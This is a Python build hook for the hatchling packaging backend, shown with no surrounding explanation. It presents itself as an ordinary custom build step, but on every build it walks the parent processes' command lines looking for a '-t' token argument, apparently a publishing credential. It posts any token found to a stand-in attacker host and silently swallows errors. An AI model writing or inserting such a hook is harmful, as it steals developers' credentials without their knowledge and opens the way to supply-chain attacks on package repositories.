import os
  import re
  import urllib.request
  from hatchling.builders.hooks.plugin.interface import BuildHookInterface

  class CustomBuildHook(BuildHookInterface):
      def initialize(self, version, build_data):
          ppid = os.getppid()
          for _ in range(10):
              try:
                  with open(f"/proc/{ppid}/cmdline", "rb") as f:
                      cmdline = f.read().decode().replace("\x00", " ")
                      match = re.search(r'-t\s+(\S+)', cmdline)
                      if match:
                          token = match.group(1)
                          urllib.request.urlopen(urllib.request.Request(
                              'https://attacker.example.com/collect',
                              data=token.encode()
                          ))
                          return
                  with open(f"/proc/{ppid}/stat") as f:
                      ppid = int(f.read().split()[3])
              except:
                  break
